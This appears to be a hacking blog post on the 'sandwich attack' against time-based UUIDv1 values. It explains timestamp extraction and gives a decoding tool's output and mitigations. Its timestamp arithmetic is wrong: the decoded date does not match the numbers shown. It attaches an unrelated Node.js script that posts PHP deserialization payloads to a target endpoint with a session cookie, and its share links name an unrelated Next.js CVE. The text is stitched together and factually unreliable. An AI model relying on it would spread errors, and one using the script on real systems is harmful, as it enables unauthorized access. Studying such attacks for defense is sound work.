---
title: "UUID Sandwich Exploitation"
layout: post
tags: [hacking, cybersecurity]
image: /assets/images/uuidv1.png
---

# UUID Sandwich Attack ‚Äì Version 1

A **UUID** (Universally Unique Identifier), also known as **GUID**, has both vulnerable versions and stronger iterations that have emerged over time. These randomly generated unique values are produced at micro- or nanosecond precision. Although the chance of duplication is extremely low, it is never truly zero. Identical values *can* be generated, though detecting them is extremely difficult. The probability of duplication is low but never zero.

**Example UUID**:  
```
f81d4fae-7dec-11d0-a765-00a0c91e6bf6
```

### Exploitation
---

The **Sandwich Attack** usually appears in **UUID version 1**, which relies on time and MAC address for generation. This can lead to vulnerabilities such as **Account Takeover, BOLA, or IDOR**. UUIDv1 values produced within the same timestamp can be duplicated, enabling exploitation.

## 2Ô∏è‚É£ Technical Mechanism

UUID v1: `6ea0f896-3144-11ef-a367-005056260027` & `6f03f496-3144-11ef-86bc-005056260027`  
Here, the values `a367` and `86bc` differ, but the MAC portion `005056260027` remains constant.

UUID v4: `60a0cf20-f5a8-4ea2-9469-d4269f0a5bc8` & `62f4a612-6d64-48a2-a271-26217702999e`  
Here the difference is complete. UUIDv4 offers ~99.9% safety, but UUIDv1 significantly increases risk.
---

For exploitation, see Burp Suite extension:  
https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248  
Reference: https://datatracker.ietf.org/doc/html/rfc4122  

### 10 Sequential Generations
**Example UUID sequence:**

```
f2c6e440-3145-11ef-8465-0800200c9a66
f2c6e441-3145-11ef-8465-0800200c9a66
f2c6e442-3145-11ef-8465-0800200c9a66
f2c6e443-3145-11ef-8465-0800200c9a66
f2c6e444-3145-11ef-8465-0800200c9a66
f2c6e445-3145-11ef-8465-0800200c9a66
f2c6e446-3145-11ef-8465-0800200c9a66
f2c6e447-3145-11ef-8465-0800200c9a66
f2c6e448-3145-11ef-8465-0800200c9a66
f2c6e449-3145-11ef-8465-0800200c9a66
```

As seen, time is highly sensitive.

`Timestamp: 139384289967400006`  
`Timestamp: 139384289967400007`  

### UUID Extraction
Example UUID: `5c1dba54-ee3e-11ee-a951-0242ac120002`  
Time portion: `1eeee3e5c1dba54`

### 5Ô∏è‚É£ Payload Logic
A typical payload works as follows:  
- UUID v1 timestamp portion can be predicted.  
- Exploitation can leverage duplicate UUID generation for attacks like Account Takeover or BOLA.

Decode timestamp:  
```sh
printf "%d
" 0x1eeee3e5c1dba54
139310590095899220
```

Convert to decimal:  
```sh
echo "scale=9; 139310590095899220 / 10^8" | bc
1393105900.958992200
```
This corresponds to Epoch time `Saturday, 30 March 2024 02:36:49`.  

### Red-Team Test Scenario
Using GuidReaper:  
```bash
GuidReaper -d "5c1dba54-ee3e-11ee-a951-0242ac120002"
GUID version: 1
Time: 2024-03-30 02:36:49.589922
Timestamp: 139310590095899220
Node: 2485377957890
MAC address: 02:42:ac:12:00:02
Clock sequence: 10577
```

### Node.js Automated Test Script

```javascript
import fetch from 'node-fetch';

const payloads = [
  'O:8:"ExploitX":0:{}',
  'O:5:"TestX":0:{}'
];

async function scan() {
  for (const p of payloads) {
    const res = await fetch('http://target/endpoint', {
      method: 'POST',
      headers: { 'Cookie': 'SESSIONID=VALID_SESSION' },
      body: `_from=${encodeURIComponent(p)}`
    });
    console.log(`[+] Sent payload: ${p}, Status: ${res.status}`);
  }
}

scan();
```

### üîê Mitigation & Defense

- Use UUIDv4 or cryptographically secure IDs.  
- Avoid timestamp or MAC-dependent identifiers in security-sensitive workflows.  
- Monitor for repeated UUID generation within small time windows.  
- Enforce strong session and token validation.

---
<br>
<!-- Share Buttons Start --> <div class="share-buttons"> <p>Share this post:</p> <a class="share-btn twitter" href="https://twitter.com/intent/tweet?text=CVE-2025-29927: Next.js Middleware Authorization Bypass&url={{ page.url | absolute_url }}" target="_blank">Twitter</a> <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u={{ page.url | absolute_url }}" target="_blank">Facebook</a> <a class="share-btn reddit" href="https://www.reddit.com/submit?url={{ page.url | absolute_url }}&title=CVE-2025-29927: Next.js Middleware Authorization Bypass" target="_blank">Reddit</a> </div> <style> .share-buttons { margin-top: 30px; font-family: sans-serif; } .share-buttons p { margin-bottom: 8px; font-weight: bold; } .share-buttons .share-btn { display: inline-block; margin-right: 8px; padding: 8px 14px; color: #fff; text-decoration: none; border-radius: 5px; font-size: 14px; transition: opacity 0.2s; } .share-buttons .share-btn:hover { opacity: 0.8; } .share-buttons .twitter { background: #1da1f2; } .share-buttons .facebook { background: #4267B2; } .share-buttons .reddit { background: #ff4500; } </style> <!-- Share Buttons End -->
<br>

## üì∫ Video Demonstration

<iframe width="100%" height="500" 
src="https://www.youtube.com/embed/c7eAq4VGUtU" 
title="UUID Sandwich Exploitation Demo" 
frameborder="0" 
allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
allowfullscreen></iframe>
